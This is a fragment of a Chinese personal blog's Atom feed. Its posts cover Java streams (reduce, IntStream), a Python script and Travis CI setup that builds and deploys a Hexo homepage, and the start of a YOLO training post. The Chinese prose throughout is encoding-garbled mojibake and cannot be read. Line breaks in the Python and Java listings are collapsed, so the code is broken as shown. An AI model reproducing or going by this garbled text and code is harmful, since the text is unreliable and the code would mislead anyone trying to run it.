cities.txtshenyang, liaoning, 100tianjin, tianjin, 20yingkou, liaoning, 10beijing, beijing, 200dalian, liaoning, 149jilin, jilin, 56haerbin, heilongjiang, 14mohe, heilongjiang, 56</code></pre><h2 id="çº¦ç®€æ“ä½œ-amp-åˆå§‹æ•°æ®æµ"><a href="#çº¦ç®€æ“ä½œ-amp-åˆå§‹æ•°æ®æµ" class="headerlink" title="çº¦ç®€æ“ä½œ &amp; åˆå§‹æ•°æ®æµ"></a>çº¦ç®€æ“ä½œ &amp; åˆå§‹æ•°æ®æµ</h2><p>çº¦ç®€æ“ä½œæ˜¯ç»ˆç»“æ“ä½œï¼Œç”¨æ¥å°†æ•´ä¸ªæµçº¦ç®€ä¸ºä¸€ä¸ªæ•°æ®ï¼Œæ¯”å¦‚æ±‚å’Œæ“ä½œã€‚</p><blockquote><p><u> U reduce(U identity,<br>             BiFunction&lt;U,? super T,U&gt; accumulator,<br>             BinaryOperator<u> combiner)<br>Performs a reduction on the elements of this stream, using the provided identity, accumulation and combining functions. This is equivalent to:<br>     <strong>U result = identity;</strong><br>     <strong>for (T element : this stream)</strong><br>         <strong>result = accumulator.apply(result, element)</strong><br>     <strong>return result;</strong><br>but is not constrained to execute sequentially.<br>The <code>identity</code> value must be an identity for the combiner function. This means that for all <code>u</code>, <code>combiner(identity, u)</code> is equal to <code>u</code>. Additionally, the <code>combiner</code> function must be compatible with the <code>accumulator</code> function; for all <code>u</code> and <code>t</code>, the following must hold:</u></u></p><pre><code> combiner.apply(u, accumulator.apply(identity, t)) == accumulator.apply(u, t)</code></pre><p>This is a <a href>terminal operation</a>.</p></blockquote><p>reduceå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°†å¹¶è¡Œæ“ä½œçš„ç»“æœåˆå¹¶ã€‚å› æ­¤è¦æ±‚ç¬¬äºŒä¸ªå‚æ•°çš„äºŒå…ƒæ“ä½œæ»¡è¶³äº¤æ¢å¾‹ã€‚</p><p>å‰é¢æåˆ°çš„æµçš„æ“ä½œéƒ½æ˜¯é’ˆå¯¹ Object ç±»å‹ï¼Œæœ‰æ—¶æˆ‘ä»¬æ›´éœ€è¦ä¸€äº›åŒ…è£…äº†åŸºæœ¬ç±»å‹çš„æµï¼Œä¾‹å¦‚ StringStream IntStream DoubleStream ç­‰</p><p>ä¸‹æ–¹æ˜¯ IntSteam ç›¸å…³çš„ç¨‹åºæ¸…å•</p><pre><code class="java">import java.io.IOException;import java.nio.charset.StandardCharsets;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.stream.Collectors;import java.util.stream.IntStream;import java.util.stream.Stream;public class Main {    public static void show(String title, IntStream stream){        final int SIZE = 10;        int[] firstElements = stream.limit(SIZE + 1).toArray();        System.out.print(title + &quot;: [&quot;);        int i;        for(i = 0; i &lt; SIZE &amp;&amp; i &lt; firstElements.length; i ++){            System.out.print(firstElements[i]);            if(i &lt; firstElements.length - 1)                System.out.print(&quot;, &quot;);        }        if(i &lt; firstElements.length)            System.out.print(&quot;...&quot;);        System.out.println(&quot;]&quot;);    }    public static void main(String args[]) throws IOException{        // æ•´æ•°æµ        IntStream is1 = IntStream.generate(() -&gt; (int)(Math.random() * 100));        show(&quot;is1&quot;, is1);        // å·¦é—­å³å¼€        IntStream is2 = IntStream.range(5, 10);        show(&quot;is2&quot;, is2);        // å·¦é—­å³é—­        IntStream is3 = IntStream.rangeClosed(5, 10);        show(&quot;is3&quot;, is3);        String contents = new String(Files.readAllBytes(Paths.get(&quot;/Users/liebes/Desktop/open.route&quot;)), StandardCharsets.UTF_8);        Stream&lt;String&gt; words = Stream.of(contents.split(&quot;\\PL+&quot;));        // é€šè¿‡mapToIntæ–¹æ³•è½¬æ¢æˆæ•´æ•°æµ        IntStream is4 = words.mapToInt(String::length);        show(&quot;is4&quot;, is4);        // è·å– Unicode ç¼–ç         String sentence = &quot;\uD835\uDD46 is the set of octonions.&quot;;        System.out.println(sentence);        IntStream codes = sentence.codePoints();        System.out.println(codes.mapToObj(c -&gt; String.format(&quot;%X&quot;, c)).collect(                Collectors.joining()        ));        // boxed å°† IntStream é‡æ–°å˜æˆåŒ…è£… Integer çš„ Stream        Stream&lt;Integer&gt; integers = IntStream.range(0, 100).boxed();        IntStream is5 = integers.mapToInt(Integer::intValue);        show(&quot;is5&quot;, is5);    }}// outputis1: [7, 61, 22, 99, 45, 81, 42, 84, 97, 82, ...]is2: [5, 6, 7, 8, 9]is3: [5, 6, 7, 8, 9, 10]is4: [3, 8, 3, 5, 3, 13, 4, 4, 3, 4, ...]ğ•† is the set of octonions.1D5462069732074686520736574206F66206F63746F6E696F6E732Eis5: [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, ...]</code></pre><h2 id="å¹¶è¡Œæµ-Parallel-Stream"><a href="#å¹¶è¡Œæµ-Parallel-Stream" class="headerlink" title="å¹¶è¡Œæµ Parallel Stream"></a>å¹¶è¡Œæµ Parallel Stream</h2><p>TODO</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;JAVAä¸­ï¼Œæµæ—¨åœ¨åˆ›å»ºä¸€ç§å…³æ³¨â€œåšä»€ä¹ˆè€Œéæ€ä¹ˆåšâ€çš„è®¾è®¡ç†å¿µï¼Œæˆ‘ä»¬æ— éœ€å…³å¿ƒæµå†…å…·ä½“çš„å®ç°ï¼Œè€ŒæŠŠæ›´å¤šç²¾åŠ›æ”¾åœ¨æµéœ€è¦åšä»€ä¹ˆä¸Šé¢ã€‚ä¾‹å¦‚æˆ‘ä»¬éœ€è¦è®¡ç®—ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ä¸­ï¼Œé•¿åº¦å¤§äº10çš„æœ‰å¤šå°‘ï¼Œå‚è§ä¸‹é¢çš„ä»£ç æ¸…å•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;java&quot;&gt;public s
      
    
    </summary>
    
      <category term="JAVAå­¦ä¹ ç¬”è®°" scheme="https://blog.liebes.top/categories/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="java" scheme="https://blog.liebes.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>hexo è®¾ç½®ç›¸å†Œã€ä¸»é¡µå¹¶ä½¿ç”¨ä¸ƒç‰›äº‘åŠ é€Ÿå›¾ç‰‡åŠ è½½</title>
    <link href="https://blog.liebes.top/2018/02/07/front-qiniu/"/>
    <id>https://blog.liebes.top/2018/02/07/front-qiniu/</id>
    <published>2018-02-07T15:23:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>æ®æ¢å®Œåšå®¢ä¸»é¢˜ä¹‹åä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä½†æ€»è§‰å¾—å“ªé‡Œä¸å¯¹çš„æ ·å­ï¼Œåˆ«äººå®¶éƒ½æ˜¯ä¸»é¡µå’Œåšå®¢åˆ†å¼€çš„ï¼Œæˆ–è€…æŠŠåšå®¢æ”¾åœ¨ä¸»é¡µçš„å­ç›®å½•ä¸‹ï¼Œè€Œè‡ªå·±çš„å´åªæœ‰ä¸€ä¸ªåšå®¢ï¼Œåæ­£è‡ªå·±ä¹Ÿæœ‰åŸŸåï¼Œä¸ºä»€ä¹ˆä¸æ•´ä¸ªå•ç‹¬çš„ä¸»é¡µå‡ºæ¥å‘¢ã€‚</p><p>è¿™ç¯‡æ–‡ç« è®°å½•äº†æµ·ç—´æ˜¯å¦‚ä½•åœ¨ google ä¸Šæ‰’æ¨¡ç‰ˆï¼Œå¦‚ä½•åˆ©ç”¨ travis æ¥å°†åšå®¢çš„å†…å®¹åŒæ­¥åˆ°ä¸»é¡µä¸Šï¼Œåˆå¦‚ä½•ä¸æŸæ¶›äº’ç›¸æ¯”è¾ƒï¼Œè§£å†³å›¾ç‰‡åŠ è½½æ…¢çš„é—®é¢˜ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹çœ‹æœ€ç»ˆçš„æ•ˆæœï¼š<a href="https://www.liebes.top" target="_blank" rel="noopener">https://www.liebes.top</a></p><p>åœ¨ä¸€åˆ‡å¼€å§‹ä¹‹å‰ï¼Œæµ·ç—´å·²ç»å‡†å¤‡å¥½äº†ç”¨ hexo æ­å»ºèµ·æ¥çš„åšå®¢ï¼Œä¸€ä¸ªè‡ªå·±çš„åŸŸåï¼Œä»¥åŠä½¿ç”¨ travis å°†åšå®¢éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨çš„è„šæœ¬ã€‚å¯ä»¥å‚è§ä¸Šä¸€ç¯‡åšå®¢ï¼š<a href="https://blog.liebes.top/2018/01/25/hexo-material/">Hexo æ›´æ¢ materail ä¸»é¢˜ï¼Œä½¿ç”¨ Travis æŒç»­é›†æˆ</a></p><h2 id="ä¸€ä»½é è°±çš„ä¸»é¡µæ¨¡æ¿"><a href="#ä¸€ä»½é è°±çš„ä¸»é¡µæ¨¡æ¿" class="headerlink" title="ä¸€ä»½é è°±çš„ä¸»é¡µæ¨¡æ¿"></a>ä¸€ä»½é è°±çš„ä¸»é¡µæ¨¡æ¿</h2><p>å…³äºå¦‚ä½•æ‰¾åˆ°ä¸€ä»½é«˜ç«¯ä¸Šæ¡£æ¬¡çš„ä¸»é¢˜æ¨¡æ¿ï¼Œå¤§å®¶å¯ä»¥å„æ˜¾ç¥é€šï¼Œå½“ç„¶ï¼Œæœ€å¿«çš„è¿˜æ˜¯ google ä¸Šæœä¸€ä¸‹ï¼šâ€œä¸»é¡µ æ¨¡æ¿ bootstrapâ€ï¼Œè¯·ä¸€å®šåŠ ä¸Š bootstrap è¿™ä¸ªå…³é”®å­—ï¼Œå› ä¸ºç»è¿‡å®è·µï¼Œè¿™æ ·æœå‡ºçš„ç»“æœæœ€é è°±ã€‚</p><p>å‡†å¤‡å¥½ä¹‹åï¼Œå°±å¯ä»¥å°†æ¨¡æ¿æ–‡ä»¶æ”¾åœ¨åšå®¢çš„æ ¹ç›®å½•ä¸‹ï¼Œéšä¾¿èµ·ä¸ªåå­—ï¼Œå°±åƒè¿™æ ·ï¼š</p><pre><code>â”œâ”€â”€ _config.ymlâ”œâ”€â”€ db.jsonâ”œâ”€â”€ liebes.top &lt;- è¿™ä¸ªæ˜¯æ¨¡æ¿æ–‡ä»¶â”œâ”€â”€ liebes.top.py &lt;- è¿™ä¸ªæ˜¯ä¹‹åä¼šç”¨åˆ°çš„è„šæœ¬æ–‡ä»¶â”œâ”€â”€ node_modulesâ”œâ”€â”€ package-lock.jsonâ”œâ”€â”€ package.jsonâ”œâ”€â”€ publicâ”œâ”€â”€ pyyamlâ”œâ”€â”€ scaffoldsâ”œâ”€â”€ sourceâ”œâ”€â”€ themesâ””â”€â”€ travis.enc</code></pre><p>æ ¹æ®ä½ çš„éœ€è¦æ¥ä¿®æ”¹ä½ çš„ä¸»é¡µæ¨¡æ¿ã€‚</p><h2 id="åŠ¨æ€è·å–åšå®¢å†…å®¹ï¼ŒåµŒå…¥ä¸»é¡µä¸­"><a href="#åŠ¨æ€è·å–åšå®¢å†…å®¹ï¼ŒåµŒå…¥ä¸»é¡µä¸­" class="headerlink" title="åŠ¨æ€è·å–åšå®¢å†…å®¹ï¼ŒåµŒå…¥ä¸»é¡µä¸­"></a>åŠ¨æ€è·å–åšå®¢å†…å®¹ï¼ŒåµŒå…¥ä¸»é¡µä¸­</h2><p>å¦‚æœä½ å¸Œæœ›ä½ çš„ä¸»é¡µä¸Šæ˜¾ç¤ºä¸€äº›ä½ çš„ä¸ªäººåŠ¨æ€ï¼Œä½ å°±è¦åŠ¨ä¸€ç•ªæ‰‹è„šäº†ã€‚</p><p>ä¸€ä¸ªç®€å•çš„åŠæ³•ï¼Œå°±æ˜¯ä½¿ç”¨ php åšä¸ªåå°æ”¯æŒï¼Œè¿™å¹¶ä¸éš¾ã€‚</p><p>æµ·ç—´å¸Œæœ›å°†è‡ªå·±æœ€è¿‘å†™çš„åšå®¢æ˜¾ç¤ºåœ¨ä¸»é¡µä¸Šï¼ŒåŒæ—¶æ˜¾ç¤ºä¸€äº›ç›¸å†Œé‡Œé¢çš„ç…§ç‰‡ã€‚ä¸€ä¸ªç®€å•çš„æ€è·¯ï¼Œå°±æ˜¯è¯»å–åšå®¢ç›®å½•ä¸­çš„é™æ€æ–‡ä»¶ï¼Œæå–å†…å®¹ï¼Œæ‰¾å‡ºæ—¶é—´ç›¸è¿‘çš„éƒ¨åˆ†ï¼Œä½¿ç”¨è„šæœ¬æ–‡ä»¶å¯¹ html è¿›è¡Œæ›¿æ¢ã€‚</p><p>äºæ˜¯æˆ‘çš„ <code>index.html</code> æ–‡ä»¶å°±å˜æˆäº†è¿™ä¸ªæ ·å­ï¼š</p><pre><code class="Html">&lt;section class=&quot;swag text-center&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div class=&quot;col-md-8 col-md-offset-2&quot;&gt;        &lt;h1&gt;æˆ‘å…±å†™äº† {count} ç¯‡åšå®¢&lt;span&gt;è®°å½•ç”Ÿæ´»ï¼Œè®°å½•ç‚¹æ»´&lt;/span&gt;&lt;/h1&gt;        &lt;a href=&quot;#portfolio&quot; class=&quot;down-arrow-btn&quot;&gt;&lt;i class=&quot;fa fa-chevron-down&quot;&gt;&lt;/i&gt;&lt;/a&gt;      &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;portfolio text-center section-padding&quot; id=&quot;portfolio&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;div class=&quot;row&quot;&gt;      &lt;div id=&quot;servicesSlider&quot; class=&quot;hidden-sm hidden-xs&quot;&gt;        &lt;ul class=&quot;slides&quot;&gt;          {articles}        &lt;/ul&gt;      &lt;/div&gt;        &lt;div id=&quot;servicesSlider2&quot; class=&quot;hidden-md hidden-lg&quot;&gt;            &lt;ul class=&quot;slides&quot;&gt;                {articles2} &lt;- è¿™ä¸ªæ˜¯é€‚é…å°å±å¹•çš„            &lt;/ul&gt;        &lt;/div&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/section&gt;</code></pre><p>æˆ‘å°†éœ€è¦æ›¿æ¢çš„éƒ¨åˆ†ç”¨ <code>{var}</code> æ¥æ ‡è®°ï¼Œä¸ºä¹‹åçš„è„šæœ¬æ–‡ä»¶ä½œå‡†å¤‡ã€‚</p><p>ç”±äºæœ€è¿‘åœ¨å¼„æœºå™¨å­¦ä¹ ç›¸å…³çš„ä¸œè¥¿ï¼Œpython ä½¿ç”¨çš„æ¯”è¾ƒå¤šï¼Œå°±é¡ºæ‰‹ç”¨ python å†™çš„è„šæœ¬ã€‚</p><pre><code class="python">import osimport reimport yamlimgCdnPath = &quot;http://p3q6bdexg.bkt.clouddn.com&quot;imgRule_ori = &quot;?imageMogr2/thumbnail/600x/blur/1x0/quality/75&quot;imgRule_webp = &quot;?imageMogr2/thumbnail/600x/format/webp/blur/1x0/quality/75|imageslim&quot;imgPath = &quot;https://blog.liebes.top&quot;useCdn = Truedef convert_md(filePath):    file = open(filePath, &#39;r&#39;)    content = file.read()    pattern = re.compile(r&#39;---([\s\S]*)---\n([\s\S]*)&#39;)    content = re.search(pattern, content)    prefix = content.group(1)    main = content.group(2)    pattern = re.compile(r&#39;[-`#\s]&#39;)    # print(prefix)    main = re.sub(pattern, &quot;&quot;, main)    mLen = min(len(main), 250)    main = main.decode(&#39;utf-8&#39;)[0:mLen].encode(&#39;utf-8&#39;)    pattern = re.compile(r&#39;title:( *)(.*?)( *)\n&#39;)    title = re.search(pattern, prefix).group(2)    pattern = re.compile(r&#39;date:( *)(.*?)( *)\n&#39;)    date = re.search(pattern, prefix).group(2)    pattern = re.compile(r&#39;img:( *)(.*?)( *)\n&#39;)    img = &quot;&quot;    try:         img = (imgPath, imgCdnPath)[useCdn] + re.search(pattern, prefix).group(2) + (&quot;&quot;, imgRule_ori)[useCdn]    except:        img = &quot;img/portfolio-01.jpg&quot;    webSite = &quot;https://blog.liebes.top&quot;    url = date[0:10]    url = url.replace(&quot;-&quot;, &quot;/&quot;)    basename = os.path.basename(filePath)    basename = os.path.splitext(basename)[0]    return {        &#39;title&#39;: title,        &#39;date&#39; : date,        &#39;main&#39; : main,        &#39;url&#39;  : webSite + &quot;/&quot; + url + &quot;/&quot; + basename,        &#39;src&#39;  : img    }def change_html(html_path, mdList, totalCount):    html = &quot;&quot;    html2 = &quot;&quot;    s = &quot;&quot;    template = &quot;&quot;    with open(os.getcwd() + &quot;/source/_data/li-article.html&quot;, &quot;r&quot;) as file:        template = file.read()    for idx, item in enumerate(mdList):        tem = template        tem = tem.replace(&quot;{title}&quot;, item[&#39;title&#39;])        tem = tem.replace(&quot;{url}&quot;, item[&#39;url&#39;])        tem = tem.replace(&quot;{content}&quot;, item[&#39;main&#39;])        tem = tem.replace(&quot;{src}&quot;, item[&#39;src&#39;])        s = s + tem        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        if idx % 3 == 2:            s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;            html = html + s            s = &quot;&quot;    content = &quot;&quot;    with open(html_path, &#39;r&#39;) as file:        content = file.read()    content = content.replace(&quot;{articles}&quot;, html)    content = content.replace(&quot;{count}&quot;, str(totalCount))    content = content.replace(&quot;{articles2}&quot;, html2)    with open(html_path, &#39;w&#39;) as file:        file.write(content)def convert_links(filePath):    links = {}    template = &quot;&quot;    html = &quot;&quot;    html2 = &quot;&quot;    with open(filePath + &quot;/links.yaml&quot;, &#39;r&#39;) as file:        links = yaml.load(file)    with open(filePath + &quot;/li-links.html&quot;, &quot;r&quot;) as file:        template = file.read()    s = &quot;&quot;    for idx, k in enumerate(links):        tem = template        tem = tem.replace(&quot;{link}&quot;, links[k][&quot;link&quot;])        tem = tem.replace(&quot;{pic}&quot;, links[k][&quot;avatar&quot;])        tem = tem.replace(&quot;{desc}&quot;, links[k][&quot;descr&quot;])        tem = tem.replace(&quot;{name}&quot;, k)        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        s = s + tem        if idx % 3 == 2:            s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;            html = html + s            s = &quot;&quot;    if s != &quot;&quot;:        s = &quot;&lt;li&gt;&quot; + s + &quot;&lt;/li&gt;&quot;        html = html + s        s = &quot;&quot;    content = &quot;&quot;    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;r&quot;) as file:        content = file.read()    content = content.replace(&quot;{links}&quot;, html.encode(&quot;utf-8&quot;))    content = content.replace(&quot;{links2}&quot;, html2.encode(&quot;utf-8&quot;))    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;w&quot;) as file:        file.write(content)def convert_gallery(filePath):    links = {}    template = &quot;&quot;    html = &quot;&quot;    html2 = &quot;&quot;    with open(filePath + &quot;/gallery.yaml&quot;, &#39;r&#39;) as file:        links = yaml.load(file)    with open(filePath + &quot;/li-gallery.html&quot;, &quot;r&quot;) as file:        template = file.read()    s = &quot;&quot;    for idx, k in enumerate(links):        tem = template        tem = tem.replace(&quot;{src}&quot;, &quot;%s&quot;%(links[k][&quot;full_link&quot;]))        #tem = tem.replace(&quot;{src}&quot;, &quot;%s%s%s&quot;%((imgPath, imgCdnPath)[useCdn], links[k][&quot;full_link&quot;], (&quot;&quot;, imgRule_ori)[useCdn]))        s = s + tem        html2 = html2 + &quot;&lt;li&gt;&quot; + tem + &quot;&lt;/li&gt;&quot;        if idx % 2 == 1:            s = &quot;&lt;div class=\&quot;col-md-4 wp4\&quot;&gt;&quot; + s + &quot;&lt;/div&gt;&quot;            html = html + s            s = &quot;&quot;        if idx == 5:            break    if s != &quot;&quot;:        s = &quot;&lt;div class=\&quot;col-md-4 wp4\&quot;&gt;&quot; + s + &quot;&lt;/div&gt;&quot;        html = html + s        s = &quot;&quot;    html = &quot;&lt;li&gt;&quot; + html + &quot;&lt;/li&gt;&quot;    content = &quot;&quot;    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;r&quot;) as file:        content = file.read()    content = content.replace(&quot;{gallery}&quot;, html.encode(&quot;utf-8&quot;))    content = content.replace(&quot;{gallery2}&quot;, html2.encode(&quot;utf-8&quot;))    with open(os.getcwd() + &quot;/liebes.top/index.html&quot;, &quot;w&quot;) as file:        file.write(content)baseDir = os.getcwd()mds = os.listdir(baseDir + &quot;/source/_posts&quot;)totalCount = len(mds)mdList = []for md in mds:    md = baseDir + &quot;/source/_posts&quot; + &quot;/&quot; + md    turple = convert_md(md)    mdList.append(turple)mdList = sorted(mdList, key = lambda item: item[&#39;date&#39;], reverse=True)mdList = mdList[0:6]change_html(baseDir + &quot;/liebes.top/index.html&quot;, mdList, totalCount)convert_links(baseDir + &quot;/source/_data&quot;)convert_gallery(baseDir + &quot;/source/_data&quot;)</code></pre><p>è¿™ä»½ python æ–‡ä»¶å¼•ç”¨äº† pyyaml è¿™ä¸ªä¾èµ–åŒ…ï¼Œæ‰€ä»¥éœ€è¦å…ˆå®‰è£…ä¸€ä¸‹ã€‚</p><pre><code> - git clone https://github.com/yaml/pyyaml.git - cd pyyaml - sudo python setup.py install</code></pre><p>å…·ä½“çš„åšæ³•å°±æ˜¯ä½¿ç”¨æ­£åˆ™è¯»å–å‡ºæ–‡ç« æœ€å¼€å§‹çš„æ•°æ®ä¿¡æ¯ï¼Œæ¯”å¦‚æ—¶é—´ã€æ ‡é¢˜ç­‰ç­‰ï¼Œç„¶åå»å¯¹ html åšæ›¿æ¢ã€‚ä¸è¯¦è¯´ï¼Œæœ‰é—®é¢˜å¯ä»¥åœ¨è¯„è®ºåŒºæé—®ã€‚</p><h2 id="Travis-è„šæœ¬ä¿®æ”¹"><a href="#Travis-è„šæœ¬ä¿®æ”¹" class="headerlink" title="Travis è„šæœ¬ä¿®æ”¹"></a>Travis è„šæœ¬ä¿®æ”¹</h2><p>æœ¬ç€ç¨‹åºå‘˜ä¸€åˆ‡ä»ç®€çš„å¿ƒæ€ï¼Œå½“æŠŠé¡¹ç›®æäº¤åˆ° github ä¸Šä¹‹åï¼Œå°±åº”è¯¥å®Œæˆä¸€åˆ‡çš„éƒ¨ç½²æ“ä½œï¼Œäºæ˜¯é€‚å½“ä¿®æ”¹Travis è„šæœ¬</p><pre><code>before_install:  - git clone https://github.com/yaml/pyyaml.git  - cd pyyaml  - sudo python setup.py install  - cd ..  ...script:  - python liebes.top.py  - rsync -az -vv --delete -e &#39;ssh&#39; liebes.top/ root@www.liebes.top:/var/www/www  ...</code></pre><p>å½“ç„¶ï¼Œè¿™éœ€è¦ä½ åœ¨æœåŠ¡å™¨ä¸Šæå‰é…ç½®å¥½ nginx </p><h2 id="å›¾ç‰‡åŠ è½½åŠ é€Ÿ"><a href="#å›¾ç‰‡åŠ è½½åŠ é€Ÿ" class="headerlink" title="å›¾ç‰‡åŠ è½½åŠ é€Ÿ"></a>å›¾ç‰‡åŠ è½½åŠ é€Ÿ</h2><p>åœ¨æˆ‘ç¾æ»‹æ»‹çš„å¼„å®Œæ‰€æœ‰çš„å·¥ä½œä¹‹åï¼Œä¸‹ä¸€ä¸ªé—®é¢˜å›°æ‰°äº†æˆ‘ï¼šç½‘ç«™åŠ è½½æ…¢ã€‚å¦‚æœä½ ä¹Ÿæ˜¯ä½¿ç”¨çš„é˜¿é‡Œäº‘æœ€ä½é…çš„æœåŠ¡å™¨ï¼Œä½ ä¹Ÿä¸€å®šä¼šé‡åˆ°è¿™ä¸ªé—®é¢˜ã€‚å›¾ç‰‡åŠ è½½æ…¢å¸¦æ¥çš„è¿é”ååº”å°±æ˜¯ js çš„æ‰§è¡Œä¼šç­‰å¾… DOM åŠ è½½å®Œæ¯•ï¼Œäºæ˜¯åˆšæ‰“å¼€ç½‘ç«™çš„æ—¶å€™å°±ä¼šæœ‰ä¸€ç§ç½‘ç«™çƒ‚æ‰çš„é”™è§‰ã€‚</p><p>ä¸ƒç‰›äº‘å¯ä»¥æä¾›å…è´¹çš„å¯¹è±¡å­˜å‚¨æœåŠ¡ï¼Œæœ‰å…è´¹çš„ 10G å¯ä»¥ä½¿ç”¨ã€‚</p><p><a href="https://portal.qiniu.com" target="_blank" rel="noopener">https://portal.qiniu.com</a> ä¸ƒç‰›äº‘ç½‘å€</p><p>å®åè®¤è¯åå¯ä»¥åˆ›å»ºå¯¹è±¡å­˜å‚¨èµ„æºï¼Œåˆ›å»ºå¥½ä¹‹ååœ¨ <code>å†…å®¹ç®¡ç† -&gt; ä¸Šä¼ æ–‡ä»¶</code> ä¸Šä¼ ä½ çš„æ–‡ä»¶ï¼Œä¹‹åå°±å¯ä»¥ä½¿ç”¨å¤–é“¾è¿›è¡Œè®¿é—®äº†ã€‚</p><p>è¯·ä¸€å®šç»§ç»­å°†å›¾ç‰‡ä¼ åˆ°ä½ çš„ git ä»“åº“ä¸­ï¼Œå› ä¸ºå¦‚æœæŸä¸€å¤©åŠ é€ŸæœåŠ¡å–æ¶ˆäº†ï¼Œä½ çš„å›¾ç‰‡å°±ä¸è§äº†ã€‚</p><p>è¿™æ ·æŠ˜è…¾å®Œï¼ŒåŸºæœ¬ä¸Šé¡µé¢åŠ è½½é€Ÿåº¦ä¼šåœ¨ 5s å†…æå®š</p><p>æœ€ååæ§½ä¸€å¥ï¼Œå†™å®Œ python å†™å…¶ä»–è¯­è¨€ï¼Œå‡ºç°çš„é”™è¯¯åŸºæœ¬éƒ½æ˜¯æ²¡å†™åˆ†å· ï¼šï¼‰</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æ®æ¢å®Œåšå®¢ä¸»é¢˜ä¹‹åä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œä½†æ€»è§‰å¾—å“ªé‡Œä¸å¯¹çš„æ ·å­ï¼Œåˆ«äººå®¶éƒ½æ˜¯ä¸»é¡µå’Œåšå®¢åˆ†å¼€çš„ï¼Œæˆ–è€…æŠŠåšå®¢æ”¾åœ¨ä¸»é¡µçš„å­ç›®å½•ä¸‹ï¼Œè€Œè‡ªå·±çš„å´åªæœ‰ä¸€ä¸ªåšå®¢ï¼Œåæ­£è‡ªå·±ä¹Ÿæœ‰åŸŸåï¼Œä¸ºä»€ä¹ˆä¸æ•´ä¸ªå•ç‹¬çš„ä¸»é¡µå‡ºæ¥å‘¢ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç¯‡æ–‡ç« è®°å½•äº†æµ·ç—´æ˜¯å¦‚ä½•åœ¨ google ä¸Šæ‰’æ¨¡ç‰ˆï¼Œå¦‚ä½•åˆ©ç”¨ trav
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="hexo" scheme="https://blog.liebes.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ ä¹‹ darknet YOLO è®­ç»ƒ VOC æ•°æ®é›†</title>
    <link href="https://blog.liebes.top/2018/01/30/ML-darknet-1/"/>
    <id>https://blog.liebes.top/2018/01/30/ML-darknet-1/</id>
    <published>2018-01-30T13:27:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘è¢«å®‰æ’åˆ°ä¸­æ±½ç ”å®ä¹ ï¼ˆå°±ç®—æ˜¯å®ä¹ å§ï¼‰ï¼Œåšäº†ä¸€äº›åŸºäºæ·±åº¦å­¦ä¹ çš„å›¾åƒè¯†åˆ«å·¥ä½œï¼Œå…¶å®è¯´èµ·æ¥è‡ªå·±å¯¹æ·±åº¦å­¦ä¹ ä¹Ÿæ²¡ä»€ä¹ˆå¤ªæ·±å…¥çš„äº†è§£ï¼Œéƒ½æ˜¯ç°å­¦ç°å–ï¼Œè·‘äººå®¶çš„ä¾‹å­ã€‚ä¸è¿‡è¿˜æ˜¯åœ¨è¿™è¾¹è®°å½•ä¸€ä¸‹ï¼Œä»¥åå›é¦–å¯ä»¥ç¨ç¨æ„Ÿæ…¨ä¸€ä¸‹å¹´è½»æ—¶çš„æ— çŸ¥ã€‚</p><p>å…³äºæœºå™¨å­¦ä¹ ï¼ŒåŸºç¡€çŸ¥è¯†æ˜¯çœ‹<em>å‘¨å¿—åçš„è¥¿ç“œä¹¦ï¼ˆæ¸…åå¤§å­¦å‡ºç‰ˆç¤¾çš„æœºå™¨å­¦ä¹ ï¼‰</em>æ¥å­¦ä¹ çš„ï¼Œä¸è¿‡å¤§è‡´æ˜¯å›«å›µåæ£ï¼Œæ²¡æœ‰é™ä¸‹å¿ƒæ¥å®‰å®‰ç¨³ç¨³åœ°é’»ç ”ï¼ˆæ—¶é—´ä¹Ÿä¸å…è®¸ï¼‰ã€‚</p><p>ä¹‹åçœ‹äº†ç½‘æ˜“äº‘è¯¾å ‚ä¸­<a href="https://mooc.study.163.com/course/2001281002#/info" target="_blank" rel="noopener"><strong>å´æ©è¾¾çš„æœºå™¨å­¦ä¹ æ•™ç¨‹</strong></a>ï¼Œå—ç›ŠåŒªæµ…ï¼Œæ¨èåˆšå…¥é—¨çš„åŒå­¦å»çœ‹çœ‹ï¼Œè®²çš„å¾ˆå¥½ã€‚</p><p>åœ¨å´æ©è¾¾çš„è§†é¢‘ä¸­ï¼Œå¤§è‡´äº†è§£äº†å·ç§¯ç¥ç»ç½‘ç»œå’Œæ·±åº¦å­¦ä¹ 